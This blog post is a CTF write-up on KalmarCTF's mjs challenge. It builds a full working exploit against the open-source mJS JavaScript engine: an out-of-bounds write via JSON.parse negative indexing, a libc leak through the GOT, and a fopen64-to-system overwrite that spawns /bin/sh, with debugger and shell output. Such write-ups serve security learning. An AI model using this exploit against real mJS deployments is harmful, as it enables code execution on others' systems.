---
title: "Hacking Toddler Js Engine"
date: 2023-03-15T18:24:55+07:00
draft: false
iscjklanguage: false
isarchived: false
categories: ["CTF"]
images: ["https://images.unsplash.com/photo-1501139083538-0139583c060f?w=1920&q=50"]
aliases: []
description: "Noob approach to hacking javascript engine"
summary: "Noob approach to hacking javascript engine"
---


## Introduction

This article is a writeup of a challenge from [KalmarCTF](https://kalmarc.tf/) called mjs. The challenge is to hack a javascript engine and get the flag. The challenge is easy, but I think it's still a good challenge to learn about getting started with javascript engine.


## What is MJS ?

MJS is a javascript engine written in C. The source code is available [here](https://github.com/cesanta/mjs). The engine is a very simple and had few builtin function. for example :
- `print(arg1, arg2, ...);`
Print arguments to stdout, separated by space.

- `load('file.js', obj);`
    Execute file `file.js`. `obj` parameter is optional. `obj` is a global namespace object. If not specified, a current global namespace is passed to the script, which allows `file.js` to modify the current namespace.

- `die(message);`
    Exit interpreter with the given error message.

- `let value = JSON.parse(str);`
    Parse JSON string and return parsed value.

- `let str = JSON.stringify(value);`
    Get string representation of the mJS value.

- `let proto = {foo: 1}; let o = Object.create(proto);`
    Create an object with the provided prototype.

- `'some_string'.slice(start, end);`
    Return a substring between two indices. Example: `'abcdef'.slice(1,3) === 'bc';`

- `'abc'.at(0);`
    Return numeric byte value at given string index. Example: `'abc'.at(0) === 0x61;`

- `'abc'.indexOf(substr[, fromIndex]);`
    Return index of first occurrence of substr within the string or `-1` if not found. Example: `'abc'.indexOf('bc') === 1;`

- `chr(n);`
    Return 1-byte string whose ASCII code is the integer `n`. If `n` is not numeric or outside of `0-255` range, `null` is returned. Example: `chr(0x61) === 'a';`

- `let a = [1,2,3,4,5]; a.splice(start, deleteCount, ...);`
    Change the contents of an array by removing existing elements and/or adding new elements. Example: `let a = [1,2,3,4,5]; a.splice(1, 2, 100, 101, 102); a === [1,100,101,102,4,5];`

- `let s = mkstr(ptrVar, length);`
    Create a string backed by a C memory chunk. A string `s` starts at memory location `ptrVar`, and is `length` bytes long.

- `let s = mkstr(ptrVar, offset, length, copy = false);`
    Like `mkstr(ptrVar, length)`, but string `s` starts at memory location `ptrVar + offset`, and the caller can specify whether the string needs to be copied to the internal mjs buffer. By default, it's not copied.

- `let f = ffi('int foo(int)');`
    Import C function into mJS. See next section.

- `gc(full);`
    Perform garbage collection. If `full` is `true`, reclaim RAM to OS.




## Challenge 
The challenge is to get Remote Code Execution (RCE) by giving malicious JS to engine. But there's a problem, the CTF Author apply patch to disable some builtin function. The builtin function that disabled are :
- `ffi()`
- `mkstr()`
- `s2o()`

These function is used to call C function from JS. So we can't use it to get RCE. 

~~~patch
diff --git a/Makefile b/Makefile
index d265d7e..d495e84 100644
--- a/Makefile
+++ b/Makefile
@@ -5,6 +5,7 @@ BUILD_DIR = build
 RD ?= docker run -v $(CURDIR):$(CURDIR) --user=$(shell id -u):$(shell id -g) -w $(CURDIR)
 DOCKER_GCC ?= $(RD) mgos/gcc
 DOCKER_CLANG ?= $(RD) mgos/clang
+CC = clang
 
 include $(SRCPATH)/mjs_sources.mk
 
@@ -81,7 +82,7 @@ CFLAGS += $(COMMON_CFLAGS)
 # NOTE: we compile straight from sources, not from the single amalgamated file,
 # in order to make sure that all sources include the right headers
 $(PROG): $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) $(TOP_HEADERS) $(BUILD_DIR)
-	$(DOCKER_CLANG) clang $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)
+	$(CC) $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)
 
 $(BUILD_DIR):
 	mkdir -p $@
diff --git a/src/mjs_builtin.c b/src/mjs_builtin.c
index 6f51e08..36c2b43 100644
--- a/src/mjs_builtin.c
+++ b/src/mjs_builtin.c
@@ -137,12 +137,12 @@ void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) {
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_load));
   mjs_set(mjs, obj, "print", ~0,
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_print));
-  mjs_set(mjs, obj, "ffi", ~0,
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call));
-  mjs_set(mjs, obj, "ffi_cb_free", ~0,
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free));
-  mjs_set(mjs, obj, "mkstr", ~0,
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr));
+  /* mjs_set(mjs, obj, "ffi", ~0, */
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */
+  /* mjs_set(mjs, obj, "ffi_cb_free", ~0, */
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */
+  /* mjs_set(mjs, obj, "mkstr", ~0, */
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */
   mjs_set(mjs, obj, "getMJS", ~0,
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_get_mjs));
   mjs_set(mjs, obj, "die", ~0,
@@ -151,8 +151,8 @@ void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) {
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_do_gc));
   mjs_set(mjs, obj, "chr", ~0,
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_chr));
-  mjs_set(mjs, obj, "s2o", ~0,
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o));
+  /* mjs_set(mjs, obj, "s2o", ~0, */
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */
 
   /*
    * Populate JSON.parse() and JSON.stringify()
diff --git a/src/mjs_exec.c b/src/mjs_exec.c
index bd48fea..24c2c7c 100644
--- a/src/mjs_exec.c
+++ b/src/mjs_exec.c
@@ -835,7 +835,7 @@ MJS_PRIVATE mjs_err_t mjs_execute(struct mjs *mjs, size_t off, mjs_val_t *res) {
 
           *func = MJS_UNDEFINED;  // Return value
           // LOG(LL_VERBOSE_DEBUG, ("CALLING  %d", i + 1));
-        } else if (mjs_is_string(*func) || mjs_is_ffi_sig(*func)) {
+        } else if (mjs_is_ffi_sig(*func)) {
           /* Call ffi-ed function */
 
           call_stack_push_frame(mjs, bp.start_idx + i, retval_stack_idx);
~~~

## Write What Where

By doing simple issue search, we can find a [Buffer Overflow Issue](https://github.com/cesanta/mjs/issues/191) in the repository. 

~~~javascript
(JSON.stringify([1, 2, 3]))((JSON.parse - 10900)(JSON.stringify([1, 2, 3])));
~~~
If we look into the payload, it substracting 10900 from the JSON.parse function. It doesnt make sense to me, but it is a valid javascript code. By running the code, it will trigger segmentation fault and it verified that the bug its still exist. 
~~~bash
➜  build git:(master) ✗ ./mjs_compiled writeup.js 
[1]    19023 segmentation fault (core dumped)  ./mjs_compiled writeup.js
~~~

I tried to simplified the payload and the simple version to trigger bug is 
~~~javascript
JSON.parse[-1] = 1;
~~~
![SIGSEGV](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398635/225323734-a0c9d786-8d78-4531-ba0b-adce069e49a1_ksxvsn.png)

![](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398636/225324781-1add18e5-d31c-4767-ae5a-e68a667038dc_x16gbx.png)

If we look at the debugger, it tries to copy the 1 value into address JSON.parse[-1]. 

![](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398634/225325662-40381717-2616-4f39-b3f1-05c2111aaca3_khcgbu.png)

What we got here is a write-what-where primitive. We can write any value to any address.

## Information Leak
Leaking address is also abusing JSON.parse function. 
![](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398635/225329032-804508fb-f520-4f80-8d70-213267235829_r0x0in.png)
As you can see it leaking some number. If we want to leak specific address, we need to calculate the base offset first. 
![](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398635/225330622-7f800715-9922-4616-a72b-42cb2f0c068a_dtr6bh.png)

From the screenshot above, we knew that the base address is started at 0x555555554000. We can calculate the offset by using the following formula. 
~~~bash
pwndbg> x (ptr + ikey) - 0x555555554000
0xfe3f:	Cannot access memory at address 0xfe3f
~~~
We got the base binary address at -0xfe3f. Lets verify by using the following code.
~~~javascript
JSON.parse[-0xfe3f] = 1;
~~~
~~~bash
pwndbg> x ptr+ikey
0x555555554001:	0x02464c45
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554000     0x555555556000 r--p     2000 0      /home/syahrul/CTF/KalmarCTF/pwn/browser/build/mjs_compiled
~~~
Its seem we need to add 1 byte to the offset for the correct address.
~~~javascript
JSON.parse[-0xfe40] = 1;
~~~
~~~bash
pwndbg> x ptr+ikey
0x555555554000:	0x464c457f
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554000     0x555555556000 r--p     2000 0      /home/syahrul/CTF/KalmarCTF/pwn/browser/build/mjs_compiled
~~~

Now we need to find pointer that point to libc address. We can easily find it by using Global Offset Table (GOT) address. 
![](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398635/225334979-701b23ba-5446-4b90-ac54-04759d39dc41_lg9fpt.png)

If you look at the line of got, the address 0x555555580018 which is free@GLIBC_2.2.5 is pointing to 0x7ffff7ca5460 inside libc. 
~~~bash
pwndbg> x 0x555555580018 - 0x555555554000
0x2c018:	Cannot access memory at address 0x2c018
pwndbg> 
~~~
0x2c018 is offset from the base address. 

Lets validate by leaking those address.
~~~javascript
let base = -0xfe40;
let free = 0x2c018;
JSON.parse[base + free];
~~~

![](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398635/225487564-7d182ca4-ea13-44ab-8a91-0d441c6e2a1a_qoyzyi.png)

If we increase the address, we got leak from some adress inside libc. When we convert it to hex, you will saw the pattern of libc address.
~~~python
Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(96)
'0x60'
>>> hex(84)
'0x54'
>>> hex(202)
'0xca'
>>> hex(247)
'0xf7'
~~~
![](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398635/225488274-fb7c67f3-b9a6-4a60-87ce-669a13866313_idapw2.png)

We leaking the free libc address byte by byte.

## Exploitation

Since we got everthing we need to exploit the binary, we can start to exploit it. 

### Leak libc address
~~~javascript
let base = -0xfe40;
let free_got = 0x2c018;
let free_addr = "0x";
let hexChars = "0123456789abcdef";

function intToHex(num) {
  let hex = "";
  while (num > 0) {
    let remainder = num % 16;
    hex = hexChars[remainder] + hex;
    num = (num - remainder) / 16;
  }

  if (hex.at(1) === undefined){
    hex = "0" + hex;
  }
  return hex;
}
for (let i = 5; i >= 0; i--) {
  free_addr += intToHex(JSON.parse[base+free_got+i])
}
print("free_addr: " , free_addr);
~~~

~~~bash
pwndbg> r do.js
Starting program: /home/syahrul/CTF/KalmarCTF/pwn/browser/build/mjs_compiled do.js
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
free_addr:  0x7ffff7ca5460 
undefined
[Inferior 1 (process 6668) exited normally]
~~~

### Overwrite fopen64@GLIBC_2.2.5

Why we need to overwrite fopen64@GLIBC_2.2.5? 
Argument from the fopen64 function is a pointer to a string that contains the name of the file to be opened. It used by load() function to load the file. So if we change the fopen64@GLIBC_2.2.5 to system@GLIBC_2.2.5, we can execute any command we want. 
![](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398634/225491024-189a615c-6ebd-488f-9da2-bbe659f245bb_qjv5lg.png)

### Final Exploit
~~~javascript
let base = -0xfe40;
let free_got = 0x2c018;
let free_addr = "0x";
let hexChars = "0123456789abcdef";
let fopen64_got = 0x2c0f0;

function intToHex(num) {
  let hex = "";

  while (num > 0) {
    let remainder = num % 16;
    hex = hexChars[remainder] + hex;
    num = (num - remainder) / 16;
  }

  if (hex.at(1) === undefined){
    hex = "0" + hex;
  }
  return hex;
}

for (let i = 5; i >= 0; i--) {
  free_addr += intToHex(JSON.parse[base+free_got+i])
}

function stringToInt(str) {
  let num = 0;

  for (let i = 2; i < 14; i++) {
    let char = str.at(i);
    let charValue = hexChars.indexOf(chr(char));
    num = num * 16 + charValue;
  }
  return num;
}

function toHex(num){
  let hex = "";

  while (num > 0) {
    let remainder = num % 16;
    hex = hexChars[remainder] + hex;
    num = (num - remainder) / 16;
  }

  if (hex.at(1) === undefined){
    hex = "0" + hex;
  }
  return hex;
};


function hexToByte(hexStr) {
  let byte = 0;
  for (let i = 0; i < hexStr.length; i++) {
    let digit = hexStr.at(i);
    if (digit >= 48 && digit <= 57) { 
      digit -= 48;
    } else if (digit >= 65 && digit <= 70) {  
      digit -= 55;
    } else if (digit >= 97 && digit <= 102) {  
      digit -= 87;
    } else {
      die("Invalid hexadecimal character");
    }
    byte = byte * 16 + digit;
  }
  return byte;
}



function hack(hexStr) {
  let iter = 0;
  for (let i = 0; i < hexStr.length; i += 2) {
    let hexPair = hexStr.slice(i, i + 2);
    JSON.parse[base+fopen64_got-iter + 5] = hexToByte(hexPair);
    iter++;
  }
};


let libc = stringToInt(free_addr) - 676960;
print("free_addr: " , free_addr);
print("libc: " , toHex(libc));
print("system: " , toHex(libc+0x50d60));
let rip = libc + 0x50d60;
hack(toHex(rip));

load("/bin/sh")

~~~
~~~bash
➜  build git:(master) ✗ ./mjs_compiled do.js
free_addr:  0x7f44060a5460 
libc:  7f4406000000 
system:  7f4406050d60 
$ ls
1.js  do.js  dump  exploit.py  hack.js	leak.js  mjs_compiled  plt  poc1.js  poc2.js  poc3.js  poc.js  pwn.js  writeup.js
$ ud
/bin/sh: 2: ud: not found
$ id
uid=1000(syahrul) gid=1000(syahrul) groups=1000(syahrul),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare),140(libvirt),999(docker)
$ pwd
/home/syahrul/CTF/KalmarCTF/pwn/browser/build
$ 
~~~